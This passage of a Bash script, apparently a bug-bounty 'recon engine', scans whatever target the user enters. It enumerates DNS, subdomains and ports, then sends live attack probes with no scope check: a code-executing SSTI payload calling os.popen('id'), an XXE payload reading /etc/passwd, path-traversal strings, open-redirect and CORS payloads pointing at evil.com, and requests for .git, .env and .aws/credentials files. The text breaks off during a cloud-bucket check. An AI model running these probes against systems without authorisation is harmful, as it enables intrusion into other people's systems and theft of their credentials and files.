main() {
    # Show banner
    printf '\033[2J\033[H'
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════╗"
    echo -e "║${WHITE}       BB AI RECON ENGINE V8.0 IMMORTAL                   ${MAGENTA}║"
    echo -e "║${WHITE} 320 RedTeam + 220 BlackTeam + 20 Heal + 75 Ext + 288 CVE  ${MAGENTA}║"
    echo -e "║${WHITE}   + 50 Post-Exploit + 65 APK · 1,038 Total · 863 CVEs     ${MAGENTA}║"
    echo -e "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"

# =========================
# TARGET + PATH
# =========================
if [ -f "$HOME/.bb_last_target" ]; then
    read -p "Target [ENTER=$(cat "$HOME/.bb_last_target")]: " TARGET
    [ -z "$TARGET" ] && TARGET=$(cat "$HOME/.bb_last_target")
else
    read -p "Target example.com: " TARGET
fi
if [ -z "$TARGET" ]; then
    err "No target provided. Retrying in 5s..."
    sleep 5
    return
fi

# Strip protocol if user accidentally included it
echo "$TARGET" > "$HOME/.bb_last_target"
TARGET="${TARGET#https://}"
TARGET="${TARGET#http://}"
TARGET="${TARGET%%/*}"

read -p "Save path [ENTER = ~/bb_v7_ultimate]: " SAVE_PATH
SAVE_PATH="${SAVE_PATH:-$BASE}"

TIME=$(date +%Y-%m-%d_%H-%M-%S)
SESSION="$SAVE_PATH/$TARGET/${TIME}_scan${SCAN_COUNT}"
mkdir -p "$SESSION"/{recon,web,api,auth,advanced,exposure,network,reports,bt,rt,pt,apk,cve}


log "Session: $SESSION"

# =========================
# SCORE SYSTEM
# =========================
WEB_SCORE=0
API_SCORE=0
AUTH_SCORE=0
EXPOSURE_SCORE=0
ADV_SCORE=0

# =========================
# HELPERS
# =========================

# ═══════════════════════════════════════════════════════════════════════════
# ═══ 15 BASE MODULES ═══
# ═══════════════════════════════════════════════════════════════════════════

# ─── 1. IP + WHOIS + DNS ───
_section "[1/75] DNS RECONNAISSANCE"
run "Resolving target IP..."
IP=$(dig +short "$TARGET" A 2>/dev/null | head -n1)
[ -z "$IP" ] && IP=$(getent hosts "$TARGET" 2>/dev/null | awk '{print $1}' | head -n1)
[ -z "$IP" ] && IP="UNRESOLVED"
ok "IP Address: $IP"

run "DNS records..."
dig "$TARGET" ANY +short > "$SESSION/recon/dns_any.txt" 2>/dev/null
dig "$TARGET" MX +short > "$SESSION/recon/dns_mx.txt" 2>/dev/null
dig "$TARGET" TXT +short > "$SESSION/recon/dns_txt.txt" 2>/dev/null
dig "$TARGET" NS +short > "$SESSION/recon/dns_ns.txt" 2>/dev/null
ok "DNS records saved"

run "WHOIS lookup..."
whois "$TARGET" > "$SESSION/recon/whois.txt" 2>/dev/null && ok "WHOIS saved" || info "WHOIS unavailable"

# ─── 2. PAGE FETCH ───
_section "[2/75] PAGE ACQUISITION"
run "Fetching homepage..."
_curl "https://$TARGET" > "$SESSION/web/index.html"
_curl -sI "https://$TARGET" > "$SESSION/web/headers_raw.txt"
local page_size=$(wc -c < "$SESSION/web/index.html" 2>/dev/null || echo 0); ok "Page fetched (${page_size} bytes)"

# ─── 3. ENDPOINT EXTRACTION ───
_section "[3/75] ENDPOINT EXTRACTION"
run "Extracting href endpoints..."
grep -Eoi 'href="[^"]+"' "$SESSION/web/index.html" 2>/dev/null | \
    sed 's/href="//;s/"$//' | sort -u > "$SESSION/web/links_href.txt"
grep -Eoi 'action="[^"]+"' "$SESSION/web/index.html" 2>/dev/null | \
    sed 's/action="//;s/"$//' | sort -u > "$SESSION/web/links_action.txt"
grep -Eoi '/[a-zA-Z0-9_/@$.~+!*'"'"'(),-]+' "$SESSION/web/index.html" 2>/dev/null | \
    sort -u > "$SESSION/web/endpaths.txt"
cat "$SESSION/web/links_href.txt" "$SESSION/web/endpaths.txt" 2>/dev/null | sort -u > "$SESSION/web/all_endpoints.txt"
CNT=$(wc -l < "$SESSION/web/all_endpoints.txt" 2>/dev/null | tr -d ' ')
ok "$CNT unique endpoints extracted"
WEB_SCORE=$((WEB_SCORE + 15))

# ─── 4. JS FILES ───
_section "[4/75] JAVASCRIPT EXTRACTION"
run "Collecting JS files..."
grep -Eoi 'src="[^"]+\.js[^"]*"' "$SESSION/web/index.html" 2>/dev/null | \
    sed 's/src="//;s/"$//' | sort -u > "$SESSION/web/js_files.txt"
# Also find inline JS
grep -c '<script' "$SESSION/web/index.html" 2>/dev/null | \
    xargs -I{} echo "Inline script blocks: {}" > "$SESSION/web/js_inline.txt"
JS_CNT=$(wc -l < "$SESSION/web/js_files.txt" 2>/dev/null | tr -d ' ')
ok "$JS_CNT external JS files found"
WEB_SCORE=$((WEB_SCORE + 10))

# ─── 5. PARAMETER MINING ───
_section "[5/75] PARAMETER MINING"
run "Mining URL parameters..."
grep -Eoi '[?&][a-zA-Z0-9_-]+=' "$SESSION/web/index.html" 2>/dev/null | \
    sed 's/^[?&]//;s/=$//' | sort -u > "$SESSION/web/params_url.txt"
grep -Eoi 'name="[^"]+"' "$SESSION/web/index.html" 2>/dev/null | \
    sed 's/name="//;s/"$//' | sort -u > "$SESSION/web/params_form.txt"
cat "$SESSION/web/params_url.txt" "$SESSION/web/params_form.txt" 2>/dev/null | sort -u > "$SESSION/web/all_params.txt"
P_CNT=$(wc -l < "$SESSION/web/all_params.txt" 2>/dev/null | tr -d ' ')
ok "$P_CNT unique parameters discovered"

# ─── 6. LOGIN SURFACE DETECTION ───
_section "[6/75] AUTH SURFACE DETECTION"
run "Scanning for auth interfaces..."
grep -Eoi '(login|signin|auth|password|credential|session|token|oauth|sso|saml|2fa|mfa|otp|register|signup|forgot)' \
    "$SESSION/web/index.html" 2>/dev/null | sort -u | head -20 > "$SESSION/auth/auth_surface.txt"
if [ -s "$SESSION/auth/auth_surface.txt" ]; then
    AUTH_SCORE=$((AUTH_SCORE + 20))
    ok "Auth surface detected ($(wc -l < "$SESSION/auth/auth_surface.txt" | tr -d ' ') indicators)"
else
    info "No obvious auth surface found"
fi

# ─── 7. JWT DETECTION ───
_section "[7/75] JWT TOKEN HUNTING"
run "Searching for JWT tokens..."
grep -Eoi 'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{0,}' \
    "$SESSION/web/index.html" 2>/dev/null | sort -u > "$SESSION/auth/jwt_found.txt"
if [ -s "$SESSION/auth/jwt_found.txt" ]; then
    ok "JWT token(s) detected!"
    while read -r jwt; do
        HEADER=$(echo "$jwt" | cut -d'.' -f1)
        PAYLOAD=$(echo "$jwt" | cut -d'.' -f2)
        DEC_HDR=$(echo "$HEADER" | tr '_-' '/+' | base64 -d 2>/dev/null || echo "{\"decode_error\":true}")
        DEC_PAY=$(echo "$PAYLOAD" | tr '_-' '/+' | base64 -d 2>/dev/null || echo "{\"decode_error\":true}")
        echo -e "\n--- JWT ---" >> "$SESSION/auth/jwt_decoded.txt"
        echo "Raw: ${jwt:0:80}..." >> "$SESSION/auth/jwt_decoded.txt"
        echo "Header: $DEC_HDR" >> "$SESSION/auth/jwt_decoded.txt"
        echo "Payload: $DEC_PAY" >> "$SESSION/auth/jwt_decoded.txt"
        ALG=$(echo "$DEC_HDR" | grep -oi '"alg":"[^"]*"' | cut -d'"' -f4)
        [ "$ALG" = "none" ] || [ "$ALG" = "None" ] || [ "$ALG" = "NONE" ] && \
            echo "⚠️  CRITICAL: alg=none detected!" >> "$SESSION/auth/jwt_decoded.txt"
        [ "$ALG" = "HS256" ] && echo "⚠️  HMAC algo — test algo confusion" >> "$SESSION/auth/jwt_decoded.txt"
    done < "$SESSION/auth/jwt_found.txt"
    AUTH_SCORE=$((AUTH_SCORE + 15))
    ok "JWT(s) decoded and analyzed"
else
    info "No JWT tokens found"
fi

# ─── 8. SECURITY HEADERS ───
_section "[8/75] SECURITY HEADERS AUDIT"
run "Analyzing security headers..."
MISSING_HDRS=0
for hdr in "strict-transport-security" "content-security-policy" "x-frame-options" \
           "x-content-type-options" "referrer-policy" "permissions-policy"; do
    if ! grep -qi "^$hdr:" "$SESSION/web/headers_raw.txt" 2>/dev/null; then
        echo "MISSING: $hdr" >> "$SESSION/web/missing_headers.txt"
        MISSING_HDRS=$((MISSING_HDRS + 1))
    fi
done
if [ $MISSING_HDRS -gt 0 ]; then
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + MISSING_HDRS * 3))
    info "$MISSING_HDRS security headers missing"
else
    ok "All critical security headers present"
fi

# ─── 9. COOKIE SECURITY ───
_section "[9/75] COOKIE SECURITY AUDIT"
run "Analyzing Set-Cookie directives..."
grep -i "set-cookie" "$SESSION/web/headers_raw.txt" 2>/dev/null > "$SESSION/auth/cookies_raw.txt"
if [ -s "$SESSION/auth/cookies_raw.txt" ]; then
    while read -r cookie; do
        FLAG_ISSUES=""
        echo "$cookie" | grep -qi "httponly" || FLAG_ISSUES="$FLAG_ISSUES [No HttpOnly]"
        echo "$cookie" | grep -qi "secure" || FLAG_ISSUES="$FLAG_ISSUES [No Secure]"
        echo "$cookie" | grep -qi "samesite" || FLAG_ISSUES="$FLAG_ISSUES [No SameSite]"
        echo "$cookie" | grep -qi "path=/;" || echo "$cookie" | grep -qi "path=/ " || FLAG_ISSUES="$FLAG_ISSUES [Path not /]"
        [ -n "$FLAG_ISSUES" ] && echo "$cookie -> $FLAG_ISSUES" >> "$SESSION/auth/cookie_issues.txt"
    done < "$SESSION/auth/cookies_raw.txt"
    if [ -f "$SESSION/auth/cookie_issues.txt" ]; then
        AUTH_SCORE=$((AUTH_SCORE + 10))
        info "Cookie security issues found"
    fi
    ok "Cookie analysis complete"
fi

# ─── 10. API / GRAPHQL DETECTION ───
_section "[10/75] API SURFACE DETECTION"
run "Detecting API endpoints..."
grep -Eoi '(api|graphql|rest|swagger|openapi|postman|v1/|v2/|v3/)' \
    "$SESSION/web/index.html" "$SESSION/web/js_files.txt" 2>/dev/null | sort -u > "$SESSION/api/api_indicators.txt"
# Test GraphQL
curl -s -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' --connect-timeout 10 > "$SESSION/api/graphql_test.txt" 2>/dev/null
if grep -q '"data"\|"__typename"' "$SESSION/api/graphql_test.txt" 2>/dev/null; then
    ok "GraphQL endpoint confirmed active!"
    API_SCORE=$((API_SCORE + 25))
    # Try introspection
    curl -s -X POST "https://$TARGET/graphql" \
        -H "Content-Type: application/json" \
        -d '{"query":"query{__schema{types{name}}}"}' --connect-timeout 10 > "$SESSION/api/graphql_introspect.txt" 2>/dev/null
    grep -q '__schema' "$SESSION/api/graphql_introspect.txt" 2>/dev/null && \
        ok "⚠️  GraphQL introspection ENABLED" && API_SCORE=$((API_SCORE + 15))
fi
if [ -s "$SESSION/api/api_indicators.txt" ]; then
    API_SCORE=$((API_SCORE + 15))
    ok "API indicators found"
fi

# ─── 11. SUBDOMAIN ENUMERATION ───
_section "[11/75] SUBDOMAIN ENUMERATION"
run "Collecting subdomains from certificate transparency..."
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" --connect-timeout 15 2>/dev/null | \
    grep -o '"name_value":"[^"]*' | cut -d'"' -f4 | sed 's/\\*\.//g' | sort -u > "$SESSION/recon/subdomains_all.txt"
SUB_CNT=$(wc -l < "$SESSION/recon/subdomains_all.txt" 2>/dev/null | tr -d ' ')
ok "$SUB_CNT unique subdomains from CT logs"

# ─── 12. LIVE SUBDOMAIN CHECK ───
_section "[12/75] LIVE SUBDOMAIN VERIFICATION"
run "Checking subdomain liveness (top 20)..."
> "$SESSION/recon/subdomains_live.txt"
while read -r sub; do
    [ -z "$sub" ] && continue
    CODE=$(_status "https://$sub")
    [ "$CODE" != "000" ] && echo "$CODE $sub" >> "$SESSION/recon/subdomains_live.txt"
done < <(head -n 20 "$SESSION/recon/subdomains_all.txt" 2>/dev/null)
LIVE_CNT=$(wc -l < "$SESSION/recon/subdomains_live.txt" 2>/dev/null | tr -d ' ')
ok "$LIVE_CNT subdomains responded"

# ─── 13. CACHE ANALYSIS ───
_section "[13/75] CACHE HEADER ANALYSIS"
run "Analyzing cache controls..."
_curl -sI "https://$TARGET" | grep -iE "cache-control|x-cache|age|vary|etag|last-modified|cf-cache" > "$SESSION/web/cache_headers.txt" 2>/dev/null
if grep -qi "no-store\|no-cache\|private\|must-revalidate" "$SESSION/web/cache_headers.txt" 2>/dev/null; then
    ok "Cache controls properly configured"
else
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 5))
    info "Weak or missing cache controls"
fi

# ─── 14. NMAP PORT SCAN ───
_section "[14/75] PORT SCANNING"
run "Running service scan..."
if command -v nmap >/dev/null 2>&1; then
    nmap -sV -T4 --top-ports 100 --open "$TARGET" > "$SESSION/network/nmap.txt" 2>/dev/null && \
        ok "Port scan complete" || info "Nmap scan had issues"
else
    info "nmap not installed, skipping port scan"
fi

# ─── 15. BASE SCORE CALCULATION ───
_section "[15/75] BASE SCORE COMPUTATION"
BASE_TOTAL=$((WEB_SCORE + API_SCORE + AUTH_SCORE + EXPOSURE_SCORE))
info "Base modules total: $BASE_TOTAL"


# ═══════════════════════════════════════════════════════════════════════════
# ═══ 60 ADVANCED MODULES ═══
# ═══════════════════════════════════════════════════════════════════════════

# ─── ADV 1. DNS ZONE TRANSFER (AXFR) ───
_section "[ADV 1/60] DNS ZONE TRANSFER ATTEMPT"
run "Attempting AXFR on nameservers..."
> "$SESSION/recon/dns_axfr.txt"
while read -r ns; do
    [ -z "$ns" ] && continue
    dig "@$ns" "$TARGET" AXFR +short >> "$SESSION/recon/dns_axfr.txt" 2>/dev/null
done < "$SESSION/recon/dns_ns.txt"
if [ -s "$SESSION/recon/dns_axfr.txt" ]; then
    ok "⚠️  ZONE TRANSFER SUCCESSFUL — Critical exposure!"
    ADV_SCORE=$((ADV_SCORE + 35))
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 30))
else
    info "Zone transfer denied (good)"
fi

# ─── ADV 2. SSL/TLS CONFIGURATION AUDIT ───
_section "[ADV 2/60] SSL/TLS SECURITY AUDIT"
run "Analyzing TLS configuration..."
echo "" | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | \
    openssl x509 -noout -text > "$SESSION/network/tls_cert.txt" 2>/dev/null
# Check supported protocols
echo | openssl s_client -connect "$TARGET:443" -tls1 2>/dev/null | grep -q "BEGIN CERTIFICATE" && \
    echo "⚠️  TLS 1.0 supported (weak)" >> "$SESSION/network/tls_issues.txt"
echo | openssl s_client -connect "$TARGET:443" -tls1_1 2>/dev/null | grep -q "BEGIN CERTIFICATE" && \
    echo "⚠️  TLS 1.1 supported (weak)" >> "$SESSION/network/tls_issues.txt"
# Check cert expiry
echo | openssl s_client -connect "$TARGET:443" 2>/dev/null | \
    openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2 > "$SESSION/network/tls_expiry.txt"
EXPIRY=$(cat "$SESSION/network/tls_expiry.txt" 2>/dev/null)
[ -n "$EXPIRY" ] && ok "Cert expires: $EXPIRY"
if [ -f "$SESSION/network/tls_issues.txt" ]; then
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 10))
    info "TLS weaknesses detected"
else
    ok "TLS configuration looks strong"
fi

# ─── ADV 3. CORS MISCONFIGURATION DEEP SCAN ───
_section "[ADV 3/60] CORS DEEP ANALYSIS"
run "Testing CORS policy..."
> "$SESSION/advanced/cors_tests.txt"
ORIGIN_HDRS=(
    "https://evil.com"
    "null"
    "https://$TARGET.evil.com"
    "https://localhost"
    "https://127.0.0.1"
    "file://"
)
CORS_VULN=0
for origin in "${ORIGIN_HDRS[@]}"; do
    RESP=$(_curl -sI -H "Origin: $origin" "https://$TARGET")
    ACAO=$(echo "$RESP" | grep -i "access-control-allow-origin" | awk -F': ' '{print $2}' | tr -d '\r')
    ACAC=$(echo "$RESP" | grep -i "access-control-allow-credentials" | awk -F': ' '{print $2}' | tr -d '\r')
    [ -n "$ACAO" ] && echo "Origin: $origin -> ACAO: $ACAO | ACAC: $ACAC" >> "$SESSION/advanced/cors_tests.txt"
    if [ "$ACAO" = "$origin" ] && [ "$origin" != "https://$TARGET" ]; then
        [ "${ACAC,,}" = "true" ] && SEV="CRITICAL" || SEV="HIGH"
        echo "⚠️  $SEV: Reflected origin — $origin" >> "$SESSION/advanced/cors_vulns.txt"
        CORS_VULN=1
    fi
    [ "$ACAO" = "null" ] && echo "⚠️  HIGH: Null origin accepted" >> "$SESSION/advanced/cors_vulns.txt" && CORS_VULN=1
done
if [ $CORS_VULN -eq 1 ]; then
    ADV_SCORE=$((ADV_SCORE + 20))
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 15))
    ok "CORS misconfiguration(s) found!"
else
    ok "CORS policy appears secure"
fi

# ─── ADV 4. HTTP METHOD ENUMERATION ───
_section "[ADV 4/60] HTTP METHOD ENUMERATION"
run "Testing allowed HTTP methods..."
> "$SESSION/advanced/http_methods.txt"
for method in OPTIONS PUT DELETE PATCH TRACE CONNECT; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "https://$TARGET" --connect-timeout 10 2>/dev/null)
    [ "$CODE" != "000" ] && echo "$method -> HTTP $CODE" >> "$SESSION/advanced/http_methods.txt"
    # Dangerous methods
    if [ "$method" = "PUT" ] && [ "$CODE" = "200" -o "$CODE" = "201" -o "$CODE" = "204" ]; then
        echo "⚠️  PUT enabled — potential upload vulnerability" >> "$SESSION/advanced/http_methods_danger.txt"
        ADV_SCORE=$((ADV_SCORE + 20))
        EXPOSURE_SCORE=$((EXPOSURE_SCORE + 20))
    fi
    if [ "$method" = "TRACE" ] && [ "$CODE" = "200" ]; then
        echo "⚠️  TRACE enabled — XST vulnerability" >> "$SESSION/advanced/http_methods_danger.txt"
        ADV_SCORE=$((ADV_SCORE + 10))
    fi
    if [ "$method" = "DELETE" ] && [ "$CODE" = "200" -o "$CODE" = "204" ]; then
        echo "⚠️  DELETE enabled" >> "$SESSION/advanced/http_methods_danger.txt"
    fi
done
[ -f "$SESSION/advanced/http_methods_danger.txt" ] && ok "Dangerous HTTP methods detected!" || ok "HTTP methods look safe"

# ─── ADV 5. WEBDAV DETECTION ───
_section "[ADV 5/60] WEBDAV DETECTION"
run "Checking for WebDAV..."
curl -s -X PROPFIND "https://$TARGET" -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><a:propfind xmlns:a="DAV:"><a:prop><a:displayname/></a:prop></a:propfind>' \
    --connect-timeout 10 > "$SESSION/advanced/webdav_test.txt" 2>/dev/null
if grep -qi "multistatus\|dav\|displayname" "$SESSION/advanced/webdav_test.txt" 2>/dev/null; then
    ok "⚠️  WebDAV enabled!"
    ADV_SCORE=$((ADV_SCORE + 15))
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 15))
else
    info "WebDAV not detected"
fi

# ─── ADV 6. GIT EXPOSURE CHECK ───
_section "[ADV 6/60] GIT REPOSITORY EXPOSURE"
run "Checking for exposed .git directory..."
GIT_CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/.git/HEAD" --connect-timeout 10 2>/dev/null)
if [ "$GIT_CODE" = "200" ]; then
    _curl "https://$TARGET/.git/HEAD" > "$SESSION/advanced/git_head.txt" 2>/dev/null
    if grep -q "ref:" "$SESSION/advanced/git_head.txt" 2>/dev/null; then
        ok "⚠️  .git/HEAD exposed — full repo may be downloadable!"
        EXPOSURE_SCORE=$((EXPOSURE_SCORE + 25))
        ADV_SCORE=$((ADV_SCORE + 20))
        # Try to fetch more git files
        for gitfile in config COMMIT_EDITMSG logs/HEAD; do
            _curl "https://$TARGET/.git/$gitfile" > "$SESSION/advanced/git_${gitfile//\//_}.txt" 2>/dev/null
        done
    fi
else
    info ".git directory not exposed"
fi

# ─── ADV 7. BACKUP / SENSITIVE FILE DISCOVERY ───
_section "[ADV 7/60] SENSITIVE FILE DISCOVERY"
run "Testing common backup/config files..."
BACKUP_PATHS=(
    "/.env" "/.env.local" "/.env.production" "/.env.backup"
    "/config.php.bak" "/config.php.old" "/config.php~" "/config.php.swp"
    "/database.sql" "/backup.sql" "/dump.sql" "/db.sql"
    "/.htaccess.bak" "/.htpasswd" "/.htaccess.txt"
    "/wp-config.php.bak" "/wp-config.php~"
    "/composer.json" "/composer.lock" "/package.json"
    "/.DS_Store" "/.svn/entries" "/.gitignore"
    "/phpinfo.php" "/info.php" "/_profiler/phpinfo"
    "/.dockerignore" "/Dockerfile" "/docker-compose.yml"
    "/.gitlab-ci.yml" "/.travis.yml" "/Jenkinsfile"
    "/swagger.json" "/swagger.yaml" "/api-docs" "/openapi.json"
    "/server-status" "/.well-known/security.txt"
    "/admin/" "/administrator/" "/phpmyadmin/" "/pgadmin/"
    "/.aws/credentials" "/Procfile" "/nginx.conf" "/web.config"
    "/sitemap.xml" "/robots.txt" "/crossdomain.xml" "/clientaccesspolicy.xml"
)
BK_FOUND=0
for path in "${BACKUP_PATHS[@]}"; do
    BCODE=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path" --connect-timeout 8 2>/dev/null)
    if [ "$BCODE" = "200" ]; then
        SIZE=$(curl -s "https://$TARGET$path" --connect-timeout 8 2>/dev/null | wc -c)
        [ "$SIZE" -gt 50 ] && echo "[$BCODE] $path ($SIZE bytes)" >> "$SESSION/advanced/sensitive_files.txt" && BK_FOUND=$((BK_FOUND + 1))
    fi
done
if [ $BK_FOUND -gt 0 ]; then
    ok "$BK_FOUND sensitive files exposed!"
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + BK_FOUND * 5))
    ADV_SCORE=$((ADV_SCORE + 15))
else
    ok "No exposed sensitive files found"
fi

# ─── ADV 8. FAVICON HASH (TECHNOLOGY FINGERPRINTING) ───
_section "[ADV 8/60] FAVICON FINGERPRINTING"
run "Computing favicon hashes..."
_curl "https://$TARGET/favicon.ico" > "$SESSION/web/favicon.ico" 2>/dev/null
if [ -s "$SESSION/web/favicon.ico" ]; then
    # Compute MD5 hash for Shodan-style fingerprinting
    FAV_MD5=$(md5sum "$SESSION/web/favicon.ico" 2>/dev/null | awk '{print $1}')
    FAV_MMH3=$(python3 -c "
import sys, mmh3, base64
with open('$SESSION/web/favicon.ico','rb') as f:
    data = f.read()
print(mmh3.hash(data))
" 2>/dev/null || echo "N/A (install mmh3)")
    echo "MD5: $FAV_MD5" > "$SESSION/advanced/favicon_hash.txt"
    echo "MMH3: $FAV_MMH3" >> "$SESSION/advanced/favicon_hash.txt"
    echo "Search: https://www.shodan.io/search?query=http.favicon.hash%3A$FAV_MMH3" >> "$SESSION/advanced/favicon_hash.txt"
    ok "Favicon hash: MD5=$FAV_MD5"
else
    # Try other favicon locations
    _curl "https://$TARGET/static/favicon.ico" > "$SESSION/web/favicon.ico" 2>/dev/null
    [ -s "$SESSION/web/favicon.ico" ] && ok "Favicon found at alternate path" || info "No favicon found"
fi

# ─── ADV 9. SPF / DKIM / DMARC EMAIL SECURITY ───
_section "[ADV 9/60] EMAIL SECURITY (SPF/DKIM/DMARC)"
run "Checking email authentication records..."
dig TXT "_dmarc.$TARGET" +short > "$SESSION/recon/dmarc.txt" 2>/dev/null
dig TXT "$TARGET" +short | grep -i "v=spf1" > "$SESSION/recon/spf.txt" 2>/dev/null
dig TXT "selector1._domainkey.$TARGET" +short > "$SESSION/recon/dkim.txt" 2>/dev/null
dig TXT "default._domainkey.$TARGET" +short >> "$SESSION/recon/dkim.txt" 2>/dev/null
EMAIL_ISSUES=0
[ ! -s "$SESSION/recon/dmarc.txt" ] && echo "⚠️  DMARC record missing" >> "$SESSION/recon/email_issues.txt" && EMAIL_ISSUES=$((EMAIL_ISSUES + 1))
[ ! -s "$SESSION/recon/spf.txt" ] && echo "⚠️  SPF record missing" >> "$SESSION/recon/email_issues.txt" && EMAIL_ISSUES=$((EMAIL_ISSUES + 1))
[ ! -s "$SESSION/recon/dkim.txt" ] && echo "⚠️  DKIM record missing" >> "$SESSION/recon/email_issues.txt" && EMAIL_ISSUES=$((EMAIL_ISSUES + 1))
if [ $EMAIL_ISSUES -gt 0 ]; then
    info "$EMAIL_ISSUES email authentication issues found"
    ADV_SCORE=$((ADV_SCORE + 5))
else
    ok "Email authentication properly configured"
fi

# ─── ADV 10. OPEN REDIRECT DETECTION ───
_section "[ADV 10/60] OPEN REDIRECT DETECTION"
run "Testing for open redirect vulnerabilities..."
REDIRECT_PARAMS=("redirect" "url" "next" "return" "returnUrl" "return_to" "goto" "target" "dest" "destination" "path" "link" "location" "jump" "redir" "redirect_uri" "redirect_url")
REDIRECT_PAYLOADS=("https://evil.com" "//evil.com" "/\\evil.com" "https://$TARGET.evil.com")
RR_FOUND=0
for param in "${REDIRECT_PARAMS[@]}"; do
    for payload in "${REDIRECT_PAYLOADS[@]}"; do
        RESP_HDR=$(_curl -sI "https://$TARGET/?$param=$payload" 2>/dev/null)
        LOC=$(echo "$RESP_HDR" | grep -i "^location:" | awk -F': ' '{print $2}' | tr -d '\r')
        if [ -n "$LOC" ] && echo "$LOC" | grep -qi "evil"; then
            echo "⚠️  Open redirect: ?$param=$payload -> Location: $LOC" >> "$SESSION/advanced/open_redirects.txt"
            RR_FOUND=$((RR_FOUND + 1))
        fi
    done
done
if [ $RR_FOUND -gt 0 ]; then
    ok "$RR_FOUND open redirect(s) found!"
    ADV_SCORE=$((ADV_SCORE + 20))
else
    info "No open redirects detected"
fi

# ─── ADV 11. SERVER-SIDE TEMPLATE INJECTION (SSTI) ───
_section "[ADV 11/60] SSTI DETECTION"
run "Testing for Server-Side Template Injection..."
SSTI_PAYLOADS=(
    '{{7*7}}'
    '${7*7}'
    '<%= 7*7 %>'
    '${{7*7}}'
    '#{7*7}'
    '*{7*7}'
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
)
SSTI_FOUND=0
for payload in "${SSTI_PAYLOADS[@]}"; do
    # Test as query parameter
    ENCODED=$(printf '%s' "$payload" | python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read().strip()))' 2>/dev/null || echo "$payload")
    RESP=$(_curl "https://$TARGET/?test=$ENCODED" 2>/dev/null)
    if echo "$RESP" | grep -qE '(49|\b49\b)'; then
        echo "⚠️  SSTI detected with: $payload (49=7*7)" >> "$SESSION/advanced/ssti_found.txt"
        SSTI_FOUND=$((SSTI_FOUND + 1))
        break
    fi
done
if [ $SSTI_FOUND -gt 0 ]; then
    ok "⚠️  SSTI vulnerability confirmed!"
    ADV_SCORE=$((ADV_SCORE + 25))
else
    info "SSTI not detected (may require targeted testing)"
fi

# ─── ADV 12. XXE DETECTION ───
_section "[ADV 12/60] XXE DETECTION"
run "Testing for XML External Entity vulnerability..."
XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
curl -s -X POST "https://$TARGET" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PAYLOAD" --connect-timeout 10 > "$SESSION/advanced/xxe_test.txt" 2>/dev/null
if grep -q "root:" "$SESSION/advanced/xxe_test.txt" 2>/dev/null; then
    ok "⚠️  XXE confirmed — /etc/passwd readable!"
    ADV_SCORE=$((ADV_SCORE + 30))
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 25))
elif grep -qi "xml\|entity\|doctype" "$SESSION/advanced/xxe_test.txt" 2>/dev/null; then
    info "Server accepts XML — manual XXE testing recommended"
else
    info "XXE not confirmed"
fi

# ─── ADV 13. PATH TRAVERSAL / LFI DETECTION ───
_section "[ADV 13/60] PATH TRAVERSAL & LFI"
run "Testing for Local File Inclusion..."
LFI_PAYLOADS=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
    "..%252f..%252f..%252fetc/passwd"
    "/etc/passwd%00"
    "C:\\Windows\\win.ini"
    "....\\....\\....\\Windows\\win.ini"
)
LFI_FOUND=0
# Try via common parameters
for lfi_param in file path page view include dir src load template; do
    for payload in "${LFI_PAYLOADS[@]}"; do
        RESP=$(_curl "https://$TARGET/?$lfi_param=$payload" 2>/dev/null)
        if echo "$RESP" | grep -qE "root:.*:0:0:|\[extensions\]|\[fonts\]"; then
            echo "⚠️  LFI via ?$lfi_param=$payload" >> "$SESSION/advanced/lfi_found.txt"
            LFI_FOUND=$((LFI_FOUND + 1))
        fi
    done
done
if [ $LFI_FOUND -gt 0 ]; then
    ok "$LFI_FOUND LFI vector(s) found!"
    ADV_SCORE=$((ADV_SCORE + 25))
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 20))
else
    info "No LFI detected with standard payloads"
fi

# ─── ADV 14. S3 BUCKET / CLOUD STORAGE ENUMERATION ───
_section "[ADV 14/60] CLOUD STORAGE ENUMERATION"
run "Looking for exposed cloud storage..."
# Extract potential bucket names from page
BUCKETS=$(grep -Eoi '[a-z0-9_-]+\.(s3|blob|storage)\.[^"<>\s]+' "$SESSION/web/index.html" 2>/dev/null | sort -u)
# Test common bucket patterns
COMMON_BUCKETS=("$TARGET" "${TARGET//./-}" "${TARGET//./_}" "assets-$TARGET" "cdn-$TARGET" "backup-$TARGET" "data-$TARGET")
> "$SESSION/advanced/cloud_storage.txt"
for bucket in "${COMMON_BUCKETS[@]}"; do
    for region in "s3.amazonaws.com" "s3.us-east-1.amazonaws.com" "s3.eu-west-1.amazonaws.com"; do
        BURL="https://$bucket.$region"
        BCODE=$(curl -s -o /dev/null -w "%{http_code}" "$BURL" --connect-timeout 8 2>/dev/null)
        [ "$BCODE" = "200" -o "$BCODE" = "403" ] && echo "[$BCODE] $BURL" >> "$SESSION/advanced/cloud_storage.txt"
    done
done
# Also check Google Cloud Storage & Azure
for bucket in "${COMMON_BUCKETS[@]}"; do
